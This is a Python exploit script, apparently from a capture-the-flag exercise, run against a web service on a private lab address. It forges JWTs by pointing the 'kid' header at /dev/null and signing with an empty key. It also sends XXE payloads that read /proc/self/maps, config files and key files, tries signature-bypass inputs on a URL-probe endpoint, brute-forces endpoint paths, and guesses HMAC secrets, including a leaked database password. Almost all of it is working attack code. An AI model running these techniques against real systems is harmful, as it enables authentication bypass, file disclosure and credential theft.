#!/usr/bin/env python3
"""round74 — Full /proc/self/maps + probe bypass retry + Flask instance"""
import requests, json, time, hashlib, hmac as hm, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK + WARM UP")
print("="*70)

healthy = False
for i in range(5):
    try:
        r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            print(f"  Server healthy: {r.text[:100]}")
            healthy = True
            break
        print(f"  [{r.status_code}]")
    except Exception as e:
        print(f"  Attempt {i+1}: {type(e).__name__}")
    time.sleep(3)

if not healthy:
    print("  WARNING: server may still be recovering")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: FULL /proc/self/maps — SEARCH ALL FILE PATHS")
print("="*70)

code, val = xxe_read("/proc/self/maps", timeout=20)
if code == 200 and val:
    lines = val.split('\n')
    print(f"  Total: {len(lines)} lines, {len(val)} bytes")

    # Extract ALL unique file paths from maps
    all_paths = set()
    for line in lines:
        parts = line.strip().split()
        if len(parts) >= 6:
            path = parts[5]
            if path.startswith('/'):
                all_paths.add(path)

    print(f"\n  Unique mapped files: {len(all_paths)}")

    # Categorize paths
    app_paths = sorted(p for p in all_paths if '/app/' in p)
    python_paths = sorted(p for p in all_paths if 'python' in p.lower())
    other_paths = sorted(p for p in all_paths if '/app/' not in p and 'python' not in p.lower())

    print(f"\n  === /app/ paths ({len(app_paths)}) ===")
    for p in app_paths:
        print(f"    {p}")

    print(f"\n  === Other non-python paths ({len(other_paths)}) ===")
    for p in other_paths:
        print(f"    {p}")

    print(f"\n  === Python paths ({len(python_paths)}) ===")
    for p in python_paths[:20]:
        print(f"    {p}")
    if len(python_paths) > 20:
        print(f"    ... ({len(python_paths)-20} more)")

    # Search for interesting keywords in ALL lines
    interesting_keywords = ['secret', 'probe', 'flag', 'key', 'crypt', 'ssl',
                           'gauge', 'hmac', 'sign', 'token']
    print(f"\n  === Lines with interesting keywords ===")
    for line in lines:
        lower = line.lower()
        for kw in interesting_keywords:
            if kw in lower:
                print(f"    [{kw}] {line.strip()}")
                break
else:
    print(f"  [{code}] {val[:200] if val else 'empty'}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PROBE BYPASS RETRY (server should be healthy)")
print("="*70)

time.sleep(1)

# First verify probe works normally
try:
    r = requests.post(f"{CASPI}/api/ops/probe",
        json={"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
              "sig": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"},
        headers=AUTH_OP, timeout=8)
    print(f"  Normal probe: [{r.status_code}] {r.text[:150]}")
except Exception as e:
    print(f"  Normal probe: {e}")

time.sleep(0.5)

# Now test bypass attempts
bypass_tests = [
    ("device only", {"device": "lm-01"}),
    ("device + url", {"device": "lm-01", "url": "http://127.0.0.1:3000/"}),
    ("url without sig", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level"}),
    ("sig=null", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": None}),
    ("sig=empty", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": ""}),
    ("sig=0", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": 0}),
    ("sig=false", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": False}),
    ("sig=list", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": []}),
    ("sig=dict", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": {}}),
    ("sig=true", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": True}),
    ("sig=1", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": 1}),
    ("empty body", {}),
    ("url=array", {"url": ["http://gauge-gw.internal:9100/v1/tanks/1/level"], "sig": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"}),
    # Try sending as form data instead of JSON
]

for desc, payload in bypass_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=payload,
                         headers=AUTH_OP, timeout=8)
        status = r.status_code
        body = r.text[:150].replace('\n', ' ')
        # Check for success indicators
        if status == 200 and '"body"' in r.text:
            print(f"  *** BYPASS! {desc}: [{status}] {body}")
        else:
            print(f"  {desc}: [{status}] {body}")
    except Exception as e:
        print(f"  {desc}: {type(e).__name__}")
    time.sleep(0.5)

# Try form-encoded instead of JSON
try:
    r = requests.post(f"{CASPI}/api/ops/probe",
        data={"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
              "sig": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"},
        headers=AUTH_OP, timeout=8)
    print(f"  form-encoded: [{r.status_code}] {r.text[:150]}")
except Exception as e:
    print(f"  form-encoded: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: FLASK INSTANCE + ADDITIONAL CONFIGS")
print("="*70)

instance_paths = [
    "/app/instance/config.py",
    "/app/instance/config.cfg",
    "/app/instance/application.cfg",
    "/app/instance/secrets.py",
    "/app/instance/production.cfg",
    "/app/instance/__init__.py",
    # Flask config files
    "/app/config.py",
    "/app/config.cfg",
    "/app/settings.py",
    "/app/default_config.py",
    "/app/production.py",
    # Dotenv
    "/app/.flaskenv",
    "/app/.env",
    # Alternative key locations
    "/app/keys/probe.key",
    "/app/keys/probe.pem",
    "/app/keys/probe.secret",
    "/app/keys/hmac.key",
    "/app/keys/signing.key",
    "/app/keys/gauge",
    "/app/keys/gauge-gw",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/app",
    # Maybe keys in a different format
    "/app/probe.key",
    "/app/hmac.key",
    "/app/signing.key",
]

for path in instance_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"  *** {path} ({len(val)} bytes): {val[:300]} ***")
    elif code == 400:
        print(f"  EXISTS (400): {path}")
    time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: EXPLORE GAUGE-GW BEHAVIOR VIA PROBE")
print("="*70)
print("  We have 5 signed URLs. Probe them and analyze response carefully.")
print("  Look for: version info, error messages, header leaks")

probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
]

for device, url, sig in probes:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=10)
        if r.status_code == 200:
            data = r.json()
            body = data.get("body", "")
            status = data.get("status", 0)
            print(f"  {device}: status={status} body={body}")
            # Check for extra fields
            extra = {k:v for k,v in data.items() if k not in ['body','status']}
            if extra:
                print(f"    *** EXTRA: {extra} ***")
            # Parse the body JSON
            try:
                inner = json.loads(body)
                print(f"    Fields: {list(inner.keys())}")
            except:
                pass
    except Exception as e:
        print(f"  {device}: {e}")
    time.sleep(0.5)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: KID ORACLE — TEST MORE KEY FILE PATHS")
print("="*70)
print("  Test if /app/keys/probe REALLY doesn't exist")
print("  vs just having different content than empty")

# If file doesn't exist: read() fails → exception → 403
# If file exists but empty: HMAC(b'', msg) → different from our sig → 403
# If file exists with content: HMAC(content, msg) → different from our sig → 403
# All return 403! Can't distinguish.
#
# BUT: if file exists and has KNOWN content, we can verify.
# The XXE read of /app/keys/probe returned empty.
# If it truly doesn't exist, XXE returns empty.
# If it exists and is empty, XXE returns empty AND kid oracle with empty key → 200.
#
# Let's test: kid=/app/keys/probe with EMPTY key

for kid_path in ["/app/keys/probe", "/app/keys/signing", "/app/keys/hmac",
                 "/app/keys/default", "/app/keys/secret", "/app/keys/master"]:
    token = jwt_forged(role="operator", kid=kid_path, key=b'')
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** {kid_path} EXISTS AND IS EMPTY! ***")
        else:
            print(f"  {kid_path}: [{r.status_code}] (doesn't exist or has content)")
    except Exception as e:
        print(f"  {kid_path}: {e}")
    time.sleep(0.3)

# Also test with single newline (empty file might end with \n)
for kid_path in ["/app/keys/probe"]:
    token = jwt_forged(role="operator", kid=kid_path, key=b'\n')
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** {kid_path} = '\\n' (single newline) ***")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: TRY app.py THROUGH DIFFERENT XXE TECHNIQUES")
print("="*70)

# Technique 1: Read app.py in the CARRIER field
# The carrier field might have different size limits
for field in ["carrier", "reference"]:
    code, val = xxe_read("/app/app.py", field=field, timeout=10)
    print(f"  app.py via {field}: [{code}] ({len(val) if isinstance(val, str) else '?'} bytes)")
    if code == 200 and val:
        print(f"    *** CONTENT: {val[:500]} ***")

# Technique 2: Read through /proc/self/root
code, val = xxe_read("/proc/self/root/app/app.py", timeout=10)
print(f"  /proc/self/root/app/app.py: [{code}]")
if code == 200 and val:
    print(f"    *** CONTENT: {val[:500]} ***")

# Technique 3: Use base64 encoding via PHP filter (won't work but verify)
xml_php = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/app/app.py">
]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''
try:
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml_php, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  php://filter: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  php://filter: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: WHAT ENDPOINTS EXIST? FULL PATH BRUTEFORCE")
print("="*70)

# Based on what we know, systematically check
important_paths = [
    # Auth
    "/api/auth/login", "/api/auth/register", "/api/auth/logout", "/api/auth/me",
    "/api/auth/reset", "/api/auth/verify", "/api/auth/token", "/api/auth/refresh",
    # Ops
    "/api/ops/probe/sign", "/api/ops/probe",
    "/api/ops/custody/ingest",
    "/api/ops/custody/list", "/api/ops/custody/history",
    "/api/ops/tanks", "/api/ops/tanks/list",
    "/api/ops/meters", "/api/ops/meters/list",
    "/api/ops/devices", "/api/ops/devices/list",
    "/api/ops/schedule", "/api/ops/loading",
    "/api/ops/dispatch", "/api/ops/flow",
    "/api/ops/config", "/api/ops/status",
    # Admin
    "/api/admin", "/api/admin/users", "/api/admin/config",
    "/api/admin/devices", "/api/admin/probe",
    # Misc
    "/api/v1", "/api/v1/probe", "/api/v1/sign",
    "/api/flag", "/api/shell", "/api/llehs",
    "/api/health", "/healthz",
    # Static
    "/static/js/app.js", "/static/js/main.js", "/static/js/probe.js",
    "/static/js/api.js",
    # Pages
    "/portal", "/services", "/login", "/register",
    "/about", "/contact", "/terms", "/privacy",
    "/probe", "/tanks", "/meters", "/loading",
    "/dispatch", "/schedule", "/custody",
    "/flag", "/shell", "/llehs",
]

existing = []
for path in important_paths:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP,
                        timeout=3, allow_redirects=False)
        if r.status_code not in [404, 405]:
            body = r.text[:100].replace('\n', ' ').strip()
            print(f"  [{r.status_code}] {path}: {body}")
            existing.append((path, r.status_code))
    except:
        pass
    time.sleep(0.1)

# POST variants for interesting paths
for path in ["/api/ops/custody/list", "/api/ops/tanks",
             "/api/ops/devices", "/api/ops/config",
             "/api/admin/config", "/api/admin/probe"]:
    try:
        r = requests.post(f"{CASPI}{path}", json={}, headers=AUTH_OP, timeout=3)
        if r.status_code not in [404, 405]:
            print(f"  POST [{r.status_code}] {path}: {r.text[:100]}")
    except:
        pass

print(f"\n  Existing endpoints: {[p for p, _ in existing]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: KID ORACLE WITH KNOWN HMAC — BRUTE SECRET VIA DB CONTENT")
print("="*70)
print("  db.py has default DATABASE_URL=postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal")
print("  What if PROBE_SECRET is derived from a DB value?")

url1 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig1_bytes = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# More key candidates based on discovered infrastructure
candidates = [
    # Database password
    b"terminal_web_pw",
    b"terminal_web_pw\n",
    # Database connection parts
    b"terminal_web",
    b"terminal",
    b"terminal-db",
    # Port combinations
    b"3000",
    b"9100",
    # Hostname
    b"5407f6317f5c",
    b"5407f6317f5c\n",
    # gunicorn.conf.py values
    b"gthread",
    # Keys from gunicorn config
    b"30",  # timeout
    # Docker network
    b"172.18.0.5",
    b"172.18.0.4",
    b"172.18.0.3",
    # gauge-gw
    b"gauge-gw.internal",
    b"gauge-gw",
    # Company related
    b"CaspiTerminal",
    b"caspiterminal",
    b"CaspiTerminal2026",
    # UUID/hash of hostname
    hashlib.sha256(b"5407f6317f5c").digest(),
    hashlib.md5(b"5407f6317f5c").digest(),
    hashlib.sha256(b"5407f6317f5c\n").digest(),
    # Common Docker/CTF secrets
    b"changeit",
    b"password",
    b"s3cr3t",
    b"sup3rs3cr3t",
    b"p@ssw0rd",
    b"default",
    # Oil depot themed
    b"BlackGold",
    b"blackgold",
    b"OilTerminal",
    b"oilterminal",
    b"CaspianOil",
    b"caspianoil",
    b"KazOil2026",
    b"kazoil2026",
]

for key in candidates:
    h = hm.new(key, url1, hashlib.sha256).digest()
    if h == sig1_bytes:
        try:
            decoded = key.decode('utf-8', errors='replace')
        except:
            decoded = key.hex()
        print(f"  *** PROBE_SECRET = {decoded!r} ***")

print(f"  Tested {len(candidates)} candidates — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CARRIER KEY CONTENT — SESSION JWT ANALYSIS")
print("="*70)
print("  We have a valid session JWT signed with /app/keys/carrier")
print("  Let's try to brute-force the carrier key using known JWT")

session_unsigned = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc1NDIwMSwiZXhwIjoxNzkwODQwNjAxfQ"
session_sig_b64 = "RWp3WB6MqNfCIByBaDq7EVoZwhb5L8DU1sSqAZ1CvLQ"

# Decode sig
sig_bytes = base64.urlsafe_b64decode(session_sig_b64 + "==")
print(f"  Session sig (hex): {sig_bytes.hex()}")
print(f"  Session unsigned: {session_unsigned[:60]}...")

# Try same candidates as carrier key
for key in candidates:
    h = hm.new(key, session_unsigned.encode(), hashlib.sha256).digest()
    if h == sig_bytes:
        try:
            decoded = key.decode('utf-8', errors='replace')
        except:
            decoded = key.hex()
        print(f"  *** CARRIER KEY = {decoded!r} ***")

print(f"  Tested {len(candidates)} candidates — no match")

print("\n"+"="*70)
print("DONE")
print("="*70)
